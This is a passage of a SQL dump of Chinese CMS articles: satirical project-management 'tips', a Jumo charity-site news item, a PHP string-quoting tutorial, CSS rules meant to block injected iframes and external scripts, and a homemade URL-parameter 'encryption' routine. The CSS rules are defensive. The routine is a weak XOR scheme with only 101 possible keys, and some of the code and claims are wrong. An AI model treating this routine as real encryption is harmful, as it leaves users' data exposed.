至于编程最佳实践呀, 开发文档, 环境测试, 单元测试什么的, 都是些麻烦的东西, 没必要搭理.&lt;/font&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;3. 别使用现有的代码, 从第一行代码写起;&lt;/font&gt;&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;&amp;nbsp; &amp;nbsp; 自信你想要做的功能是那么的特别, 没有什么现成的开源程序能够符合你的要求, 甚至框架也不用, 要从头开始, 并积极的给你手下的开发者灌输这种观念.&lt;/font&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;4. 确保让你的销售部门在开发团队还没有完成项目之前就开始给客户展示项目&lt;/font&gt;&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;&amp;nbsp; &amp;nbsp; 项目开始进入开发的时候, 让你的销售团队经常性的给你客户展示你的未完成品, 可预测的, 每一次销售团队都会给你带来客户的一些新的需求和对原有需求的一些改变, 让你的客户自乱阵脚, 让他们混淆自己系统应该具备的重要功能是什么&lt;/font&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;5. 让销售部门来确定项目的最后期限&lt;/font&gt;&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;&amp;nbsp; &amp;nbsp; 让你的销售部门来确定项目的最后期限, 虽然你知道他们对技术并不是很热衷, 告诉自己, 销售部门是唯一知道用户想要做什么功能, 所以他们应该为项目制定最后期限&lt;/font&gt;&lt;br /&gt;\r\n', 1, 1, 0, 0, 1303454034, 1, 'admin'),
(75, 1, 'Facebook创始人之一休斯创建一慈善社交网站', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:verdana, 宋体;font-size:14px;line-height:25px;&quot;&gt;&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;据国外媒体报道，Facebook创始人之一和奥巴马总统竞选的首席数字组织者克里斯·休斯（Chris Hughes）拥有建造在线社区的知识。现在，他将把自己的这个技术专长应用与一个名为Jumo的合资企业。Jumo的目标是联络非盈利组织和慈善机构的人们。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;休斯说，这个网站将于星期二推出，其目标是“做Yelp网站为饭店做的事情”，建立慈善机构的索引以便帮助人们找到和评估这些机构。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;在非洲农村地区建造一所学校等单个慈善项目和同性恋权利等更广泛的问题都将在Jumo网站有专门的网页。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;相关的新闻文章、Twitter帖子和YouYube视频都将添加到网页上。用户可以添加自己的反馈意见和评论。用户还能够找到自己的Facebook好友，在这个网站上跟踪他们选择的项目和问题。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;这个想法就是利用这些原则帮助休斯先生把一个自愿者的网络组织成一个成功的政治力量并且把他们应用到更广泛的事业和问题领域。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;休斯说，Jumo网站主要不是募捐。相反，这个网站首先是设法建立起用户与他们喜欢的事业之间的更深入的关系。把关心一个问题的人更多地联系在一起，他们参与这个事情的时间就会越长。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;休斯说，Jumbo网站一开始的时候将有3000多个问题和组群。不过，任何有社交使命的个人都可以创建一个网页。休斯认为，Jumo可能是较小的慈善机构在社交媒体中建立自己的一席之地的简单方法。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;Jumo本身是一个非盈利机构，将依靠用户的付款和希望在这个网站更好地推广自己的机构的赞助。&lt;/p&gt;\r\n&lt;p style=&quot;padding-bottom:0px;margin-top:5px;margin-right:0px;margin-bottom:5px;margin-left:0px;padding-left:0px;padding-right:0px;padding-top:0px;font-family:verdana, 宋体;&quot;&gt;休斯表示，Jumo不打算与Facebook竞争。相反，他预计Facebook将成为社交网站的普遍存在的支柱。人们还将使用以具体的兴趣和社区为重点的边缘网站。Jumo将发送适用于自己的用户的电子邮件和更新以帮助用户保持沟通。&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1303477924, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(76, 1, 'php处理特殊符号-php技巧', '', '', '&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;div class=&quot;t_msgfont&quot;&gt;1 PHP中单引号与双引号的区别&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　在PHP中，通常一个字符串被定义在一对引号中，如：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n''I am a string in single quotes''&amp;nbsp;&lt;br /&gt;\r\n&quot;I am a string in double quotes&quot;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　PHP语法分析器是用成对的引号来判断一个字符串的。因此，所有字符串必须使用同一种单或者双&amp;nbsp;&lt;br /&gt;\r\n引号来定义开始和结束。例如，下面的字串定义是不合法的：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&quot;I am not a valid string since I have unmatching quote marks''&amp;nbsp;&lt;br /&gt;\r\n''Me neither!&quot;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　定义字符串时，只有一种引号被视为定义符，即单引号或双引号。于是，如果一个字符串由双引&amp;nbsp;&lt;br /&gt;\r\n号开始，那么只有双引号被分析器解析。这样，你就可以在双引号串中包含任何其他字符，甚至单引&amp;nbsp;&lt;br /&gt;\r\n号。下面的引号串都是合法的：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$s = &quot;I am a ''single quote string'' inside a double quote string&quot;;&amp;nbsp;&lt;br /&gt;\r\n$s = ''I am a &quot;double quote string&quot; inside a single quote string'';&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　当PHP遇到与串的开头相对应的引号时，便认为已经到了字符串尾部，于是：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&quot;Why doesn''t &quot;this&quot; work?&quot;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　实际上被PHP语法分析器分成三个部分:&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&quot;Why doesn''t &quot;——包含一个单引号的双引号串&amp;nbsp;&lt;br /&gt;\r\nthis——多余的字符，分析器无法处理&amp;nbsp;&lt;br /&gt;\r\n&quot; work?&quot; ——普通字符串&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　上面的这个例子企图在双引号串中包含双引号，而分析器在遇到第二个双引号时便认为字符串结&amp;nbsp;&lt;br /&gt;\r\n束了。要达到包含引号的目的，必须分析器在遇到串内普通引号的时候忽略它的原意，我们在引号的&amp;nbsp;&lt;br /&gt;\r\n前面加上一个反斜杠来告诉PHP：这个引号是字符串的一部分，正确的表示方法是这样:&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&quot;Why doesn''t \\&quot;that\\&quot; work?&quot;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　在英文字符串中一个常见的问题是撇号''的使用，因为它就是一个单引号，而在英文串中十分常见&amp;nbsp;&lt;br /&gt;\r\n（英文所有格）。你必须小心处理这些字符:&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n''You\\''d better escape your apostrophes''&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　可以看到反斜杠在字符串中有他的特殊含义，当我们需要在字符串中包含反斜杠本身时，需要在&amp;nbsp;&lt;br /&gt;\r\n该符号前面多加一个反斜杠。例如：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$file = &quot;c:\\windows\\system.ini&quot;;&amp;nbsp;&lt;br /&gt;\r\necho $file; // 打印结果为： c:windowssystem.ini&amp;nbsp;&lt;br /&gt;\r\n$file = &quot;c:\\\\windows\\\\system.ini&quot;;&amp;nbsp;&lt;br /&gt;\r\necho $file; // 打印结果为： c:\\windows\\system.ini&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　另一种字符串定义方式，能够消除特殊字符的烦恼，而且便于引用较长的文本。该字符串定义方&amp;nbsp;&lt;br /&gt;\r\n法以&amp;lt;&amp;lt;&amp;lt;符号紧跟一个自定义字符串开头，最后一行以该自定义字符串结束，并且必须顶格。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n二、字串的连接&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　字串可以使用字串连接符(.)来连接，如：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$first_name = ''Charlie'';&amp;nbsp;&lt;br /&gt;\r\n$last_name = ''Brown'';&amp;nbsp;&lt;br /&gt;\r\n$full_name = $first_name . '' '' . $last_name;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　常见的用途是建立大块的HTML字串代码，赋值号 (=) 连接符 (.) 可以被简写合并为 (.=) 符&amp;nbsp;&lt;br /&gt;\r\n号，如：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$html = ''&amp;lt;table&amp;gt;'';&amp;nbsp;&lt;br /&gt;\r\n$html .= ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;number&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;square&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&amp;nbsp;&lt;br /&gt;\r\nfor ( $i=0 ; $i&amp;lt;10 ; $i++) {&amp;nbsp;&lt;br /&gt;\r\n$square = $i * $i;&amp;nbsp;&lt;br /&gt;\r\n$html .= ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;'' . $i . ''&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;'' . $square . ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\n$html .= ''&amp;lt;/table&amp;gt;'';&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n三、在字串中使用变量&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　这个功能让你无须使用连接符号来粘和大量的简单字符串。PHP允许我们在双引号串中直接包含字&amp;nbsp;&lt;br /&gt;\r\n串变量，我们可以发现下面的两个字串的处理结果是相同的。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$full_name = $first_name . '' '' . $last_name;&amp;nbsp;&lt;br /&gt;\r\n$full_name = &quot;$first_name $last_name&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　单引号串和双引号串在PHP中的处理是不相同的。双引号串中的内容可以被解释而且替换，而单引&amp;nbsp;&lt;br /&gt;\r\n号串中的内容总被认为是普通字符。例如：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$foo = 2;&amp;nbsp;&lt;br /&gt;\r\necho &quot;foo is $foo&quot;; // 打印结果: foo is 2&amp;nbsp;&lt;br /&gt;\r\necho ''foo is $foo''; // 打印结果: foo is $foo&amp;nbsp;&lt;br /&gt;\r\necho &quot;foo is $foo\\n&quot;; // 打印结果: foo is 2 (同时换行)&amp;nbsp;&lt;br /&gt;\r\necho ''foo is $foo\\n''; // 打印结果: foo is $foo\\n&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　正如你所看到的，在单引号串中甚至反斜杠也失去了他的扩展含义（除了插入反斜杠\\\\和插入单&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n2 PHP中单引号与双引号的区别&amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div class=&quot;t_msgfont&quot;&gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div class=&quot;t_msgfont&quot;&gt;引号\\''）。所以，当你想在字串中进行变量代换和包含\\n（换行符）等转义序列时，你应该使用双引&amp;nbsp;&lt;br /&gt;\r\n号。单引号串可以用在其他任何地方，脚本中使用单引号串处理速度会更快些，因为PHP语法分析器对&amp;nbsp;&lt;br /&gt;\r\n单引号串的处理方式比较单纯，而双引号的处理由于串内部也需要解析，因此更复杂些，所以处理速&amp;nbsp;&lt;br /&gt;\r\n度略慢。&amp;nbsp;&lt;/div&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1303621811, 1, 'admin'),
(77, 1, '简单css代码防止网页挂马-php技术', '', '', '&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;p&gt;一、&lt;/p&gt;\r\n&lt;p&gt;iframe{n1ifm:expression（this.src=‘about:blank’，this.outerHTML=‘’）;}/*这行代码是解决挂IFRAME木马的哦*/&lt;/p&gt;\r\n&lt;p&gt;script{nojs1:expression（（this.src.toLowerCase（）.indexOf（‘http’）==0）？document.write（‘木马被成功隔离！’）：‘’）;}&lt;/p&gt;\r\n&lt;p&gt;原理：将《script》标记的src拿出来转为小写，再看是不是以“http”开头的外域JS脚本文件，如果是，则页面内容清空并写出“木马被成功隔离！”。反之正常显示。 缺点：访客无法看到被感染了《script》木马的页面。&lt;/p&gt;\r\n&lt;p&gt;二、&lt;/p&gt;\r\n&lt;p&gt;iframe{nifm2:expression（this.src=‘about:blank’，this.outerHTML=‘’）;}&lt;/p&gt;\r\n&lt;p&gt;script{no2js:expression（（this.src.toLowerCase（）.indexOf（‘http’）==0）？document.close（）：‘’）;}&lt;/p&gt;\r\n&lt;p&gt;原理：将外域的JS文件的document.write（）使用document.close（）强制关闭。木马内容还没有来得及写完，只有部分被强制缓存输出了，剩下的不会再写了。&lt;/p&gt;\r\n&lt;p&gt;三、&lt;/p&gt;\r\n&lt;p&gt;iframe{ni3fm:expression（this.src=‘about:blank’，this.outerHTML=‘’）;}&lt;/p&gt;\r\n&lt;p&gt;script{n3ojs:expression（（this.src.toLowerCase（）.indexOf（‘http’）==0）？document.execCommand（‘stop’）：‘’）;}&lt;/p&gt;\r\n&lt;p&gt;原理：同到外域的JS文件，立即调用IE私有的execCommand方法来停止页面所有请求，所以接下来的外域JS文件也被强制停止下载了。就像我们点了浏览器的“停止”按钮一样。看来这是JS模拟IE停止按钮的一种方法。&lt;/p&gt;\r\n&lt;p&gt;四、&lt;/p&gt;\r\n&lt;p&gt;iframe{nif4m:expression（this.src=‘about:blank’，this.outerHTML=‘’）;}&lt;/p&gt;\r\n&lt;p&gt;script{noj4s:expression（if（this.src.indexOf（‘http’）==0）this.src=‘res://ieframe.dll/dnserror.htm’）;}&lt;/p&gt;\r\n&lt;p&gt;原理：将外域的JS文件的src重写成本地IE404错误页面的地址，这样，外域的JS代码不会下载。&lt;/p&gt;\r\n&lt;p&gt;五、&lt;/p&gt;\r\n&lt;p&gt;iframe{nifm5:expression（this.src=‘about:blank’，this.outerHTML=‘’）;}&lt;/p&gt;\r\n&lt;p&gt;script{noj5s:expression（（this.id.toLowerCase（）.indexOf（‘vok’）！=-1）？document.write（‘木马被成功隔离！’）：‘’））;}&lt;/p&gt;\r\n&lt;p&gt;第五种方案的页面HTML源代码&amp;lt;script&amp;gt;中要加入以“lh”为前缀的id，如lhWeatherJSapi，&amp;lt;script src=“***/**.js” id=“lhSearchJSapi”&amp;gt;&amp;lt;/script&amp;gt;&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1303621955, 1, 'admin'),
(78, 1, '如何加密url参数地址ph', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;line-height:25px;font-family:simsun;&quot;&gt;&lt;p&gt;以下是代码片段：&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;\r\nfunction keyED($txt,$encrypt_key)&amp;nbsp;''定义一个keyED&lt;br /&gt;\r\n{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$encrypt_key =&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;md5($encrypt_key);&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$ctr=0;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tmp = &quot;&quot;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($i=0;$i&amp;lt;strlen($txt);$i++)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ($ctr==strlen($encrypt_key))&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$ctr=0;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tmp.= substr($txt,$i,1) ^ substr($encrypt_key,$ctr,1);&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$ctr++;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $tmp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\nfunction encrypt($txt,$key)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$encrypt_key = md5(mt_rand(0,100));&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$ctr=0;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tmp = &quot;&quot;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for ($i=0;$i&amp;lt;strlen($txt);$i++)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ($ctr==strlen($encrypt_key))&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$ctr=0;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tmp.=substr($encrypt_key,$ctr,1) . (substr($txt,$i,1) ^ substr($encrypt_key,$ctr,1));&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$ctr++;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return keyED($tmp,$key);&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\nfunction decrypt($txt,$key)&amp;nbsp;&lt;br /&gt;\r\n{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$txt = keyED($txt,$key);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tmp = &quot;&quot;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for($i=0;$i&amp;lt;strlen($txt);$i++)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$md5 = substr($txt,$i,1);&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$i++;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$tmp.= (substr($txt,$i,1) ^ $md5);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $tmp;&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\nfunction encrypt_url($url,$key)&amp;nbsp;&lt;br /&gt;\r\n{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return rawurlencode(base64_encode(encrypt($url,$key)));&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\nfunction decrypt_url($url,$key)&amp;nbsp;&lt;br /&gt;\r\n{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return decrypt(base64_decode(rawurldecode($url)),$key);&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\nfunction geturl($str,$key)&amp;nbsp;&lt;br /&gt;\r\n{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$str = decrypt_url($str,$key);&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$url_array = explode(''&amp;amp;'',$str);&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if (is_array($url_array))&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;foreach ($url_array as $var)&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$var_array = explode(&quot;=&quot;,$var);&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$vars[$var_array[0]]=$var_array[1];&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $vars;&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;p&gt;以下是代码片段：&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p class=&quot;a_6&quot;&gt;&lt;code&gt;&amp;lt;?&amp;nbsp;&lt;br /&gt;\r\n$key = 